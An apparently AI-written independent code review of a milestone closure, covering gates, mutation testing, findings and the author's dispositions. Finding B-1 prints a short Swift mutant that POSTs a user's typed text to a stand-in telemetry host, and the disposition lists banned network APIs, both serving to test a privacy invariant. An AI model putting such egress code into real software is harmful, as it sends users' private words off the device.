---
record_type: review
id: m14-closure-review
status: ratified
seat: independent
date: 2026-09-21
---
# M14 — Stage 4.0 independent closure seat

**Commit range:** `c0b71c6..fc7fe5b` (4 commits: M13 signed, W1, W2, W3/W4). 47 files, +3272/−177.

## How this review was produced

**Seat:** independent, fresh context, fresh clone at `/tmp/claude-0/mr-clone`. I did not author any of
this code and read no author summary before the diff.

**Read (policy from the base tree, never from the change):** `subagent-profiles/Code-Reviewer.md`,
`subagent-profiles/Security-Reviewer.md`, `AGENTS.md` §3/§5, `docs/closure-checklist.md` §0/§A/§B,
`docs/plans/m14-plan.md` (§0–§6), the four wave-close records, the three M14 review records,
`docs/decisions.md` D-140..D-146, `docs/prd.md` M13/M14 sections, `docs/warnings.ledger.md`
W-085..W-098, `.governed-records`, `.language-allow`, `.github/workflows/ci.yml`, `.github/CODEOWNERS`,
`Makefile`, `pyproject.toml`, and the full diff of every source file in the range.

**Ran:** `pip install pytest pytest-xdist ruff types-PyYAML mypy pydantic fastapi --break-system-packages`;
then `ruff check src tests scripts`, `ruff check src tests`, `ruff format --check`,
`python -m pytest -q` (twice, with and without coverage), `python -m mypy src`,
`python -m mypy src tests scripts`, `python3 scripts/check_records.py`,
`python3 scripts/wave_check_all.py`, `python3 scripts/conformance_gate.py`,
`python3 conformance/run-all.py`, and **eleven mutants of my own** against Python, Swift source and a
governance record (table below), each reverted byte-identical; `git status --short` is empty at the end
and I wrote no file in the repository.

**Could not do, stated rather than implied:**

- **No Swift compiler, no Xcode, no macOS shell.** I make no claim about whether any Swift file
  compiles or whether `swift test` passes. The only evidence for the Swift half is the owner's
  `make check` on 2026-09-20 reporting `swift-test PASS: 241 test(s) (floor 241)`. I read the Swift and
  mutated it where a *Python* source-contract test claims to guard it; that is a different thing.
- **`advisor.db` is not in this clone at all** — it is gitignored (`.gitignore:50`). I could not
  re-measure any live-artifact figure: the ranked populations (29/59), the admitted counts (10 of 29,
  32 of 59), the floors 1467.5/1450.6, "both surfaces answer all three budgets", or "the nine existing
  surfaces' answers are unchanged". What I *could* check is the arithmetic those records derive, and it
  reproduces exactly (see *What held*).
- **`ruff==0.7.4` would not install** on this Python, so I could not confirm which ruff versions
  agree with the owner's machine. I report what 0.15.11 says.
- I could not query GitHub Actions; the CI claim below is inferred from a fresh clone, and labelled so.

### What each gate says, exactly

| Gate | Result |
|---|---|
| `ruff check src tests scripts` (= `make lint`, `Makefile:81`) | **FAIL — `Found 1 error.`** `S310` at `scripts/slopsquat_check.py:80`, on ruff 0.15.11 |
| `ruff check src tests` (= what CI runs, `ci.yml:49`) | `All checks passed!` |
| `python -m pytest -q` | **41 failed, 865 passed, 15 skipped, 4 errors**; `TOTAL … 89%`, `Required test coverage of 85.0% reached. Total coverage: 88.63%` |
| `python -m mypy src` (= `make typecheck`) | `Success: no issues found in 33 source files` |
| `python -m mypy src tests scripts` | fails: `Source file found twice under different module names` (`scripts/check_records.py`) |
| `python3 scripts/check_records.py` | `(scanned 103 record(s) with frontmatter)` · `check_records PASS [repo]: no findings` |
| `python3 scripts/wave_check_all.py` | `wave-check-all PASS: 34 v5.0 record(s) validated; 20 pre-migration record(s) out of scope (GPF-001 …)` |
| `python3 scripts/conformance_gate.py` | `conformance-gate PASS: 6 finding(s), all exempted and all still firing` |
| `python3 conformance/run-all.py` | `conformance FAIL: 7 test(s), 3 failing` — the 3 are the 6 standing exemptions (`make -n gate`, two M6 git-authority strings, four dangling `make pin-check`), all M3–M7, none M14 |
| `make check` as a whole | **not run** — `lint` fails here before `swift-test`, and there is no Swift toolchain in this lane |

All 41 failures and all 4 errors are one cause: `advisor.db` is absent
(`tests/unit/test_why_facts.py:124` → `AssertionError: assert False … Path('advisor.db')`;
`test_unavailable_after_boot.py` → `FileNotFoundError: … 'advisor.db'`). 34 in `test_why_facts.py`,
7 in `test_budgets_endpoint.py`, 4 in `test_unavailable_after_boot.py`. Collected total reconciles with
the records: 865 + 41 + 15 + 4 = **925** = the records' 912 + 13. **No test fails here for any reason
other than the missing artifact**, and the three files predate M14 (M11-W2, M11-W3, M12-W4).

---

## Findings

### BLOCKING

**B-1 — REQ-GAP-001's "nothing leaves the device" has no negative test that can fail, and the review
that spotted it left the hole undispositioned.**
`tests/unit/test_router_hints.py:198` (`test_the_gap_register_stays_on_the_device`) scans only the
register section of `FrontDoor.swift` for `URLSession`/`URLRequest`/`EngineClient`/`http`, plus
`client.` calls in `ContentView.swift`. The register's free text lives in `ContentView.swift` and is
recorded at `ios/ModelRanking/ContentView.swift:559-562`.

I inserted, immediately after `gaps.record(typed)`:

```swift
var req = URLRequest(url: URL(string: "https://telemetry.example.com/gap")!)
req.httpMethod = "POST"
req.httpBody = Data(typed.utf8)
URLSession.shared.dataTask(with: req).resume()
```

**Result: `41 failed, 865 passed, 15 skipped, 4 errors` — identical to baseline. The mutant survives
the entire suite.** `swift test` cannot catch it either: `ContentView.swift` is not compiled by the
Engine test target, which is the stated reason these source-contract tests exist at all.

Concrete failure this permits: the one place in the product that stores the reader's typed words
acquires an exfiltration path, and every gate in the project reports green. This is D-126, the
decision `docs/plans/m14-plan.md` §3 names as untouched.

The M14-W3/W4 seat found this and wrote it down — `docs/reviews/m14-wave-3-4-review.md`, claim C2:
*"any other egress added in ContentView (e.g. a URLSession) would not be caught."* It appears in **no
row of that record's disposition table**, which runs B-1, M-1..M-4, m-1..m-4, S-1..S-4 and "Product
effect". Per `AGENTS.md` §3, a finding with no disposition is an open loop.

Why BLOCKING rather than MAJOR: `docs/closure-checklist.md` §B.2a is a BLOCKING gate that runs before
deploy, and two of its rows cannot be ticked truthfully — V3C-74 ("every invariant cites the NEGATIVE
test that fails if it is removed") and V3C-73 ("proven by an end-to-end citing test"). `docs/plans/m14-wave-3-close.md`
row 7 is nonetheless ✅. The code is correct today — no egress exists — so this blocks the §B.2a tick and
the B.3 deploy step, not the tree. **The remedy is one assertion**: apply the same `URLSession`/`URLRequest`
ban to `ContentView.swift`'s comment-stripped body, or to every file outside `EngineClient.swift`.
This is the third recurrence of one shape — M13 security MAJOR-2 (W-090) was *"a mutant sending the
reader's words to the engine passed"*, and M13 Stage 4.0 MINOR-4 found four more doors into `task`.

### MAJOR

**M-1 — the refresh job this milestone repaired cannot be installed from this repository, and W-096 is
marked FIXED citing a script that does not exist.**
`deploy/com.hcs.modelranking.refresh.plist:8` now names
`/Users/umutcanapaydin/Library/Application Support/model-ranking/refresh_job.sh` as its program.
`scripts/enable_refresh.sh:16-17` — the repository's only installer, unchanged since M11 — copies
**only the plist** (`SRC="$REPO/deploy/$LABEL.plist"` → `DST="$HOME/Library/LaunchAgents/…"`). Nothing
in the Makefile, in `scripts/`, or in any document copies `scripts/refresh_job.sh` to Application
Support. `install_refresh_wrapper.sh`, which `docs/warnings.ledger.md:142` (W-096) names as the remedy
— *"the repo plist is rewritten to call it by `install_refresh_wrapper.sh`, which the owner runs"* —
**does not exist anywhere in the tree** (`ls scripts/`, `grep -rn install_refresh_wrapper .` returns
only that ledger line).

Concrete failure: anyone running the repo's own documented install path gets a launchd job whose
program is an absent file — the 24-day silent-refresh outage W-096 was raised for, reinstated by the
fix for it, on a machine other than the one it was hand-repaired on. `docs/closure-checklist.md` §B.3
row V3C-107 (provisioning ownership: *in the image or a named-owned row, no third category*) cannot be
ticked: the wrapper at that path is a boot prerequisite with neither. W-096's status is FIXED/CLOSED.
`conformance/test-documented-commands.py` only checks `make` targets, so it could not see this.

**M-2 — `primary_source` is documented as "informational" and as "load-bearing" in the same tree, and
nothing pins a surface to its board.**
`src/app/workflows/categories.py:23`: `primary_source: str  # informational; health flags live on
ingest reports (not persisted yet)`.
`src/app/clients/arena.py:56` (added M14-W2): *"`id` … is load-bearing: `CategorySpec.primary_source`
names it, and `build.py` maps a failed source to the surfaces that go silent."*
`src/app/workflows/build.py:186` settles it — it *is* load-bearing:
`task for task, spec in CATEGORIES.items() if spec.primary_source == source`.
`src/app/adapter/main.py:732-733` records that joining on `primary_source` was previously a *defect*,
fixed by keying on the benchmark, *because* line 23 calls it informational.

Mutant: `document`'s `primary_source` → `"arena"`. **`41 failed, 865 passed` — survives.** Concrete
failure: when `arena_document` is unavailable, `build.py` emits *"arena_document is unavailable (no
surface names it as primary)"* and never names `document` as a surface that must disclose it — D-121's
disclosure guarantee lapses silently for exactly the two surfaces this milestone added. The W2 review's
producer table (`ARENA_BOARDS`, `ArenaClient.__init__`, `parse_arena(benchmark=)`, `RemoteSource`
name↔client, `ingest_arena`) does not include this seam. This is the record-contradicts-the-code shape
the project records more than any other, and here both records are in the code.

**M-3 — REQ-SUR-001's only citing test never enters a live entry point, and the wave-close row that
says it does is ✅.**
`docs/plans/m14-wave-2-close.md` row 6: *"Every acceptance criterion has a citing test entering through
the LIVE entrypoint … REQ-SUR-001 → `tests/unit/test_categories.py::test_the_two_board_surfaces_rank_only_their_own_board`"*.
That test (`tests/unit/test_categories.py:376-389`) imports `CATEGORIES` and asserts dict-literal
fields: `spec.primary_benchmark == "Arena document"`, `spec.metric == "elo"`,
`spec.min_quality >= 1000.0`, `spec.value_window < spec.min_quality`. It never calls
`category_ranking()`, `recommend()` or `/v1`. The criterion it cites — *"rank only their own board"* —
is a property of the ranking query, not of the spec strings. `grep -rn "Arena document" tests/` shows
the only behavioural coverage is at ingest (`test_arena_client.py:305`), which is REQ-SRC-011's, not
this one. V3C-02 is gate-BLOCKING in §B.1, and the Code-Reviewer profile lists a PASS without per-criterion
evidence as automatic BLOCKING; the row's *claim* is what fails here, not the code.
(The test does earn something: my mutant repointing `document.primary_benchmark` to `"Arena text"` dies on it.)

**M-4 — nothing asserts that a reader's question reaches either new surface.**
`grep -n '"document"\|"factuality"' ios/EngineTests/*.swift` returns four hits and all four are
membership in an id list (`FrontDoorTests.swift:61`, `LanguageTests.swift:227`,
`OwnerSessionDefectTests.swift:19`, `RouterBoundaryTests.swift:45`). The real-embedding calibration
probe at `ios/EngineTests/FrontDoorTests.swift:297` carries the seven M10 questions and **no document
or factuality question**. `RouterBoundaryTests` drives stubs, not `NLContextualEmbedding`.

So the eleven-id lists prove the nine old questions do not fall out — a negative — and nothing proves
a positive. The milestone's whole premise (`docs/plans/m14-plan.md` §0: a correct refusal is still a
refusal) is that readers reach these surfaces by asking. This fell into the gap left when REQ-IMG-003
(*"the router routes an … question to it"*) was dropped with the image surface and REQ-SUR-001, which
says nothing about routing, replaced it. My mutant rewording `factuality`'s hint into a near-duplicate
of `assistant`'s passes the Python suite, and no gate in the agent lane can see hint discrimination at
all — the W2 review's MAJOR-4 fix rests entirely on the owner's `make check` **count** of 241.

**M-5 — `docs/prd.md:490` still states the display rule D-143 says it amends, and the shipped code
contradicts it.**
REQ-CMP-004 reads: *"A score is shown … with its scale NAME where the scale is unbounded but published
(`Score 1504.2 Elo`)"*. `docs/decisions.md:1851` (D-143) header: *"**Amends D-140 and REQ-CMP-004**"*.
After W4, `ios/ModelRanking/Engine/Scores.swift:53-57` prints `Score 65.0 / 100` on every anchored Elo
surface, and all four Elo surfaces carry an anchor. The M14 prd diff adds eight new rows and touches
REQ-CMP-004's line not at all (`git log -S "REQ-CMP-004" -- docs/prd.md` → `3b13b11`, M13-W4).
Concrete failure: the prd is the criteria source of truth for §B.1's coverage trace, and it now asserts
a requirement the product deliberately violates, with a citing test (`ScoresTests.swift::ScoreFormTests`)
that must therefore also have changed meaning. `AGENTS.md` §3.4 forbids exactly this.

**M-6 — dropped promises: REQ-IMG-002, REQ-IMG-003 have no disposition anywhere, and REQ-DTL-001/002
are undelivered while W-098 describes a detail screen that does not exist.**

*REQ-IMG-002/003:* `grep -rn "REQ-IMG" docs/` returns hits in `m14-plan.md` §1 and `m14-wave-1-close.md`
only, and every one of those is REQ-IMG-001 or the plan table itself. REQ-IMG-002 and REQ-IMG-003 are
in no prd row, no wave-close scope row, and no ledger row. §5 ruling 5's amendment defers the image
*surface*, which is a real mitigation — but the §1 criteria table, which `docs/closure-checklist.md`
§B.2 (V3C-90) requires to be hash-frozen and diffed at closure, was never amended, and W-098 exists
precisely because this project's standard is to ledger an undelivered plan line.

*REQ-DTL-001/002:* `docs/closure-report-m13.md:63` moves them into M14 (*"→ M14 (council ruling F2)"*)
and `docs/plans/m14-plan.md:158` relies on the detail screen as the mitigation for removing the metric
name: *"It stays available on the detail screen (REQ-DTL-001/002 …), which is where a reader who wants
the unit finds it."* **There is no detail screen.** `find ios -name "*.swift"` lists eleven files and
none is one; `ContentView.swift` has two `.sheet` modifiers, `surfaceSheet` and `gapSheet`.
`docs/warnings.ledger.md:144` (W-098) records *"price as an attribute on the detail screen … and the
metric's name kept available on the detail screen. The card and rows changed; the detail screen did
not."* — wording that implies the screen exists, and naming neither REQ-ID. Concrete failure: the
product removed the unit from every card and row with nowhere for a reader to find it, and the carried
requirement that was meant to hold it is tracked as two bullets rather than as two REQ-IDs a coverage
trace would notice missing.

**M-7 — the pulled-forward security pass was waived twice more, and neither waiver reached the ledger
that counts them.**
`docs/plans/m14-wave-1-close.md` row 4 (WAIVED, local row L3) and `docs/plans/m14-wave-2-close.md`
row 4 (WAIVED, local row L2). Both HIGH waves per the plan. `docs/decisions.md:1751` (D-141) states the
rule they were waived against: *"row 4 reads WAIVED and names a row in `docs/warnings.ledger.md`, not
only a local one, so the waiver is counted where C2b reads."* `grep '^| W-0' docs/warnings.ledger.md`
shows no M14 row for either. W-088's own text names this as the defect: *"None reached THIS ledger, so
the counter that exists to notice repetition could not count it."*

D-141 is still `proposed` — the owner signed M13 with the commit message *"D-141 left proposed:
explained, not ruled on"* (`cb8d9e6`) — so the rule is not binding, and that is the point: the control
review W-090 escalated at `C2b-reviewed: D-141 @7` has now been bypassed twice more while its ADR sits
unratified, and `check_records.py`'s `C2b` (`scripts/check_records.py:110`, `C2B_REVIEWED` with an
`@N` anchor designed to re-fire when the count grows) reports PASS because the count did not grow in
the file it reads. W-090's own closing line — *"Making C2b accept only an accepted ADR is a gate
change, queued to the owner for M14"* — is also unaddressed.

**M-8 — the M-3 fix (`score_anchor` is not `min_quality`) is defended only by numeric coincidence.**
`src/app/workflows/categories.py` sets `score_anchor` to exactly the same four numbers as `min_quality`
(1400.0, 1478.9, 1467.5, 1450.6). Mutant: `src/app/adapter/main.py:1246` →
`"score_anchor": (spec.min_quality if spec.metric == "elo" else None)`.
**`41 failed, 865 passed` — survives.** (The cruder mutant, serving `spec.min_quality` unconditionally,
dies only because percentage surfaces then publish a number instead of `null`.)

`test_a_recalibration_cannot_move_the_anchor` (`tests/unit/test_uncertainty_contract.py:300`) uses
`dataclasses.replace(spec, min_quality=spec.min_quality + 50)` and asserts `score_anchor` is unchanged
— which no dataclass field can fail; it catches only the narrow case of `score_anchor` written as a
property. `test_every_elo_surface_publishes_its_pinned_score_anchor` (`:271`) compares the served value
to `PINNED_SCORE_ANCHORS`, whose four values equal `min_quality` today. Concrete failure: the exact
regression D-146 clause 2 was written to forbid — *"The floor is re-measured at every recalibration; if
it were also the anchor, every card's number would move with no new measurement of any model"* — passes
every gate in the repository. The *board-max* mutant REQ-SCR-003 names does die, server-side and
client-side; this one is a different mutant and it is the one the ADR is about.

### MINOR

- **`make lint` is version-dependent and CI's lint is narrower than the Makefile's.**
  `Makefile:81` runs `ruff check src tests scripts`; `.github/workflows/ci.yml:49` runs
  `ruff check src tests`. `pyproject.toml:26` pins `ruff>=0.7` with no upper bound. On ruff 0.15.11,
  the Makefile form fails (`S310`, `scripts/slopsquat_check.py:80`, an f-string URL to
  `urllib.request.urlopen`) and the CI form passes. The file is from M7 (`194d578`) and is untouched by
  M14, so this is carried drift — but it means `make lint`, and therefore `make check`, is not
  reproducible across ruff versions, and the M7/W-026 widening to `scripts/` never reached CI, so
  `scripts/` has never been lint-gated by anything that runs on a push. V3C-10 asks for a pinned
  toolchain in CI. For completeness: `ruff format --check src tests scripts` says
  *"45 files would be reformatted"* — but `black` is this project's formatter (`[tool.black]`), so that
  number is informational, not a gate failure.
- **`make test` cannot be green on any machine but the owner's, and two conventions disagree about why.**
  45 tests fail or error on a fresh clone solely because `advisor.db` is gitignored, while
  `tests/unit/test_api_config.py:715` and `tests/unit/test_startup_schema_validation.py:103` **skip**
  gracefully for the identical precondition. `ci.yml` runs bare `pytest` with no artifact step, so the
  `test (py3.12)` / `test (py3.14)` jobs are almost certainly red and nothing requires them (per
  `AGENTS.md` §5 only `governance-contract` is unconditionally required) — I could not query Actions to
  confirm. Consequence for *this* closure: **no independent seat can reproduce the wave records'
  "912 passed" figure.** The collected total (925) does reconcile.
- **`docs/research/` is ungoverned, and M14 added a record to it.** `.governed-records` names
  `docs/decisions.md`, `docs/closure-report-*.md`, `docs/plans/m*-wave-*-close.md`,
  `docs/reviews/m8-*.md`, `m9-*`, `m1[0-9]-*`, `docs/fixpack-*.md`, `docs/EXPERIENCE.md` — not
  `docs/research/`. I rewrote `docs/research/question-coverage-2026-09-18.md`'s frontmatter to
  `record_type: NOT_A_TYPE`, `id: m14-plan` (a duplicate of the real plan's id) and `status: bogus`:
  `check_records PASS [repo]: no findings`. This is W-012's shape on a directory nobody named, and M14
  is the milestone that put a new record there.
- **All five M14 records the milestone closes against are `status: draft`** — `m14-plan.md` and the four
  wave-close records — while the three review records are `ratified`.
- **`note.txt` is 81 lines** against §B.4's *"≤30 lines (G.7)"*. It was 36 at `c0b71c6`, so M14 more than
  doubled an already-breached budget. (`AGENTS.md` is 149 ≤ 150, fine.)
- **`make typecheck` is `mypy src` only** (`Makefile:88`); §B.1 asks for *"Strict mypy clean across all
  modules"*. `mypy src tests scripts` does not run at all — it dies on a module-path collision on
  `scripts/check_records.py`.
- **D-146 contradicts itself on status.** `docs/decisions.md:2001` header reads
  *"**Status:** **accepted by the owner 2026-09-20**"*; its body heading at `:2017` reads
  *"**Decision (proposed).**"*. This is the ADR that clears the W3/W4 seat's only BLOCKING.
- **W-094's open half is escalated to nobody.** The M14 disposition (D-145) covers the two new surfaces;
  *"The underlying question — which rule is RIGHT — stays escalated"* carries no owning milestone, and
  `src/app/workflows/categories.py`'s header comment still knowingly states the opposite of the nine
  shipped numbers.
- **The plist rewrite deleted its own documentation.** `deploy/com.hcs.modelranking.refresh.plist` lost
  a 22-line header carrying the install/uninstall commands and the exit-code table (0 published /
  1 unchanged / 2 failed / 3 refused / 4 busy). The exit codes survive as one comment line in
  `scripts/refresh_job.sh:28`; the install instructions survive nowhere.

### NIT

- **Two findings from a ratified review have no disposition row.** `docs/reviews/m14-wave-3-4-review.md`
  NITs: `GapEntry.id` folds the *truncated* text, so two questions differing only after character 200
  merge (`FrontDoor.swift:72`); and a decoded register is never re-bounded, so a tampered file with
  `count == Int.max` traps on `+= 1` at `FrontDoor.swift:253`. Reachable only by local file tampering.
  Both are correctly graded; neither appears in the author's disposition table.
- **Mixed units are possible in one list.** `scoreOutOf100` (`Uncertainty.swift:174-180`) returns `nil`
  when `abs(anchor - score) > 2000`, so a single far-outlier row would print native Elo among /100
  neighbours. Unreachable on today's boards (the widest live spread is ~90 Elo from anchor).

---

## Promises vs delivery

### `docs/plans/m14-plan.md` §1 — acceptance criteria

| REQ-ID | Promise | Verdict |
|---|---|---|
| REQ-SRC-010 | Image board's licence reviewed and recorded before data served | **AMENDED, coherently.** No `docs/license-review-lmarena.md`; W1 close establishes the grant is dataset-level CC-BY-4.0 at D-101, plan §4 was amended to say so, W2 review m5 ACCEPTED it. Cited in `src/app/clients/arena.py:1,42,51`. |
| REQ-SRC-011 | Ingest refuses a board it cannot attribute, names the missing field | **DELIVERED.** `ingest.py:157-171`, `arena.py:78-84`; `prd.md:496`. Enters the real entry point. My attribution mutant dies. |
| REQ-IMG-001 | Ranked population counted and published before thresholds | **DELIVERED** — the answer was zero, and the plan's stop condition fired (`m14-wave-1-close.md`). |
| REQ-IMG-002 | Tenth surface ranks on its own native scale, no blending | **DROPPED, undispositioned** (M-6). |
| REQ-IMG-003 | Router routes image-editing, still refuses generation | **DROPPED, undispositioned** (M-6). |
| REQ-GAP-001 | Every decline recorded on device, nothing leaves the device | **DELIVERED in code; the invariant is unproven** (B-1). Bounds, protection class, backup exclusion, manual-tier exclusion all present. |
| REQ-GAP-002 | Owner reads the register, ordered by frequency | **DELIVERED in code** (`ContentView.swift:339-368`, `FrontDoor.swift:126`). The "read on a running app" half is `prd.md:499` *"owner, pending"*. |
| REQ-SCR-001 | Every row carries a score; no card or row shows the metric's name | **DELIVERED, weakened in transcription.** `prd.md:500` reads *"where an honest conversion exists … on an anchored Elo surface no card sentence names Elo"* — narrower than §1's absolute. ECI rank-only is explicitly permitted by D-143; the §1 table was not amended. |
| REQ-SCR-002 | Per surface, strictly monotonic, never reorders | **DELIVERED.** Logistic in `score` for fixed finite anchor; `ScoresTests.swift::testTheConversionNeverReordersOnAnyPinnedAnchor` over all four pinned anchors (owner's run). |
| REQ-SCR-003 | No surface's 100 from the board max; board-max mutant must fail | **DELIVERED as written** — the board-max mutant dies server-side (`test_uncertainty_contract.py:271`) and client-side (`test_ios_client_contract.py:578-586`). **The `min_quality` mutant survives** (M-8). |
| REQ-SCR-004 | Tie margin converts with the score; ranges re-derived | **AMENDED and recorded** — D-146 clause 3 and the plan's 2026-09-20 W4 amendment keep ranges native and convert the sentence. Correct call, properly recorded. |
| REQ-SUR-001 | *(new, not in §1)* Two surfaces rank only their own board | **DELIVERED in code; its citing test does not exercise it** (M-3). |

### §4 — definition of done

| Line | Verdict |
|---|---|
| `make check` exit 0, `SWIFT_TEST_FLOOR` raised to the printed count | Floor raised `121 → 241` (`Makefile:137`), matching the owner's `swift-test PASS: 241`. **`make check` as a whole is unverified here** and `make lint` fails in this lane (MINOR). |
| Every wave close cites an independent review dated after the code | Met as the gate defines it — W1 `m14-wave-1-review.md` 2026-09-18, W2 `m14-wave-2-review.md` 2026-09-20, W3/W4 `m14-wave-3-4-review.md` 2026-09-20; `wave_check_all` PASS. All same-day; D-137's rule is not violated but the margin is one date. |
| Licence on record, source registration cites it | Met. `rank.py:48-53` adds `arena_document`/`arena_factuality` to `SOURCE_ATTRIBUTION` individually, with the prefix-rule refusal reasoned in place. |
| Ranked-population count in the W1 record, whatever it says | Met — zero, published, and it redirected the milestone. |
| **The gap register has been read by the owner on a running app at least once** | **NOT DONE.** `prd.md:499`, `m14-wave-3-close.md` row 9b. An explicit definition-of-done line, outstanding. |

### Outstanding §B closure obligations (W5 work, not findings against the waves)

`docs/coverage-by-req.md` has no M14 REQ-IDs (last touched at `c0b71c6`) — that is a §B.1 gate row;
`docs/retrospectives/m14-retrospective.md`, `docs/closure-report-m14.md`, the M14 `EXPERIENCE.md`
entry, the `process-log.md` S14 entry, the roadmap snapshot and the cost-log/trust-telemetry rows do
not exist. 14 % 3 ≠ 0, so no quarterly handover is owed — the plan is right about that.

---

## Mutants I ran

Baseline throughout: `41 failed, 865 passed, 15 skipped, 4 errors`. Every mutant reverted; final
`git status --short` empty.

| # | Mutant | Result |
|---|---|---|
| 1 | `main.py:1246` → `"score_anchor": spec.min_quality` | **died** (42 failed) — but only via the `null`-on-percentage branch |
| 1b | `main.py:1246` → `spec.min_quality if spec.metric == "elo" else None` — the exact D-146 clause 2 regression | **SURVIVED** → M-8 |
| 2 | `categories.py` `document.score_anchor` `1467.5 → 1400.0` | **died** (42) — `PINNED_SCORE_ANCHORS` is a real pin |
| 3 | drop `"audio"` from `registry._MODALITY_TOKENS` | **died** (45) — W-092's guard is well covered |
| 4 | delete `"arena_document"` from `rank.SOURCE_ATTRIBUTION` | **died** (43) |
| 5 | `ContentView.swift:559` — POST `typed` to a remote host via `URLSession` | **SURVIVED** → **B-1** |
| 6 | `categories.py` `document.primary_benchmark` → `"Arena text"` | **died** (42) |
| 7 | `categories.py` `document.primary_source` → `"arena"` | **SURVIVED** → M-2 |
| 8 | `docs/research/question-coverage-2026-09-18.md` frontmatter → bad `record_type`, duplicate `id: m14-plan`, bad `status` | **SURVIVED** — `check_records PASS` → MINOR |
| 9 | delete the `"document"` hint from `CategoryHints.byID` | **died** (42) — the plan's stated W2 gate works |
| 10 | reword `"factuality"`'s hint into a near-duplicate of `assistant`'s | **SURVIVED** (Python lane cannot see discrimination) → M-4 |
| 11 | re-apply W-097's survivor: `ranking.sorted(by: >).filter { _ in !entries.isEmpty }` in `FrontDoor.swift` | **died** — W-097's fix holds |

---

## What held

This is the part that matters, and a lot held.

- **W-092's fix is real and well-defended.** The modality guard is a *declared* `ModelRule.modality`
  field rather than a substring of the canonical id — the seat's correction, and the docstring at
  `registry.py:30-41` explains exactly why `nano-banana-pro` broke the first version. Removing any
  modality token kills tests. `canonicalize_with_reason` separating a guard refusal from registry
  drift (`ReconcileReport.modality_drops`, `drift_dropped`) is genuinely good: it stops nineteen
  working refusals from being triaged as nineteen missing rules.
- **W-093's discipline was applied, not just recorded.** The figures in `registry.py`'s comment block
  are labelled as the independent seat's, with the author's wrong ones named and superseded in
  `docs/warnings.ledger.md:139` rather than quietly overwritten. That is the correct handling of a
  verification-that-cannot-fail.
- **Every number I could re-derive reproduces.** The /100 table in `m14-wave-3-4-review.md` and
  D-146's cost paragraph: web-dev 1711.9 @ 1478.9 → 79.27 (record 79.3); assistant 1507.6 @ 1400.0 →
  65.01 (65.0); factuality 1500.7 @ 1450.6 → 57.16 (57.2); document 1516.3 @ 1467.5 → 56.98 (57.0);
  and D-146's counterfactual "anchoring at the last ranked model puts the document leader at 65.7" →
  65.7 exactly. `scripts/calibrate_board.py:205` implements "top third over distinct models" the way
  D-145 states it, and prints `board_third_D145` so the shipped number is reproducible. Given W-093,
  I expected to find a wrong figure here and did not find one.
- **REQ-SRC-011 is the model of what an acceptance criterion should look like here.** The board→label
  lookup is refused rather than defaulted (`ingest.py:161-168`), the client refuses an unregistered
  config (`arena.py:78-84`), `minimum_rows` is sized per board rather than copied from `text`'s 250
  with the reasoning written down, `text` keeps the id `arena` so existing rows are not orphaned, and
  the citing test goes through `ingest_arena`. The MAJOR-1 mutant that merged `document` into
  `assistant` under 905 green tests now dies.
- **The W3/W4 seat was excellent and its findings were really fixed.** M-1 through M-4, m-1 through
  m-4 and S-1 through S-4 all have code behind their disposition rows: `anchoredFact` restating
  distances all-or-nothing, `recordsGap` excluding the manual tier, the anchor as its own field, the
  register in its own backup-excluded folder, `.completeFileProtection`, a byte bound beside the
  character bound, and the anchor-reach guard. The B-1 governance blocker was closed by an owner ADR
  rather than argued away. Only the C2 caveat slipped through undispositioned.
- **W-097's fix is verified, not asserted.** The `SORTING_PERMITTED` exemption is now keyed on the
  sort call's *receiver*, with a staleness assertion that fails if a permitted sort disappears. The
  seat's own survivor mutant dies (mutant 11).
- **The unit localisation held where W-085 said it would break.** `anchoredFact` sets
  `unit = "points"`, and every composer routes it through `localisedUnit`
  (`Language.swift:57,110,162-170`), which maps `points → puan`. No English unit reaches a Turkish
  sentence. The Turkish product strings are all inside files exempted **by name** in `.language-allow`;
  no new blanket exemption was added.
- **The data-flow test for the engine boundary is strong** — `test_router_hints.py:125-190` pins every
  `client.` argument to the bare `task`/`budget`, pins every assignment to `task`, forbids
  `RoutingOutcome(` in the view, forbids `$task` binding, and asserts `code.count("EngineClient(") == 1`.
  B-1 is the one door it does not cover, and it is not a small one.
- **The M10 calibration probe genuinely re-ran over eleven ids** against the real
  `SimilarityRouter()`/`NLContextualEmbedding` (`FrontDoorTests.swift:297-313`), so the plan's "no
  existing surface question falls out" is properly evidenced. What is missing is the positive half (M-4).
- **`categories.py` stayed data.** Two surfaces were added as two map entries with no code branch, and
  `test_categories_are_data_not_code` is the test that says so. D-105 is not bent: each surface ranks
  on its own benchmark label and metric, and nothing averages across boards.
- **The waived rows are honest.** Every WAIVED row in all four wave-close records names a ledger row and
  says plainly what did not run — no false greens of the W-087 kind. `m14-wave-1-close.md` row 2 even
  refuses the author's own red-first evidence (*"three raise `ImportError` on a symbol that did not
  exist yet, and the seat was right to refuse that as red-green evidence"*). That is the culture
  working.
- **`check_records`, `wave_check_all` and `conformance_gate` all pass**, mypy is clean on `src`, coverage
  is 88.63% against an 85% floor, and the six standing conformance exemptions are all pre-M14 and all
  still firing rather than deleted.

---

**VERDICT: BLOCKING** — B-1 leaves the milestone's headline privacy invariant (REQ-GAP-001 / D-126)
with a negative test that a one-line `URLSession` egress in `ContentView.swift` survives, so
`docs/closure-checklist.md` §B.2a cannot be ticked and §B.3 may not proceed; M-1 additionally means the
refresh job this milestone repaired cannot be installed from this repository at all.

---

## Disposition (author, 2026-09-21, after the seat)

| # | Finding | Disposition |
|---|---|---|
| B-1 | The gap register's "nothing leaves the device" test cannot fail on a view-level egress | **FIXED** (W-099). The ban covers the whole view and the whole front door — `URLSession`, `URLRequest`, `URL(string:`, `NWConnection`, `CFStream` — so `EngineClient` is the one door, and its arguments were already pinned. The seat's own four-line mutant was re-run: **red**, and green when reverted |
| M-1 | The refresh job cannot be installed from this repository; W-096 cited a script that does not exist | **FIXED** (W-100). `scripts/enable_refresh.sh` installs the wrapper and the plist together and refuses if they name different paths; `scripts/install_refresh_wrapper.sh` now exists for the wrapper-only case; `tests/unit/test_refresh_job_install.py` pins plist ↔ installers ↔ log paths. W-096's text carries a dated correction |
| M-2 | `primary_source` documented as informational while `build.py` relies on it | **FIXED** (W-101). The field says what it decides; all eleven pairs pinned AND driven through `_surfaces_left_without_evidence` |
| M-3 | REQ-SUR-001's citing test never enters a live entry point | **FIXED** (W-102). `test_a_board_only_reaches_its_own_surface_through_the_ranking_query` reads three boards through `category_ranking` |
| M-4 | Nothing asserts a reader can reach the two new surfaces | **FIXED** (W-103), measured by the owner's `make check`: `testTheTwoNewSurfacesAreReachableByAsking` runs the real embedding router on two plain questions |
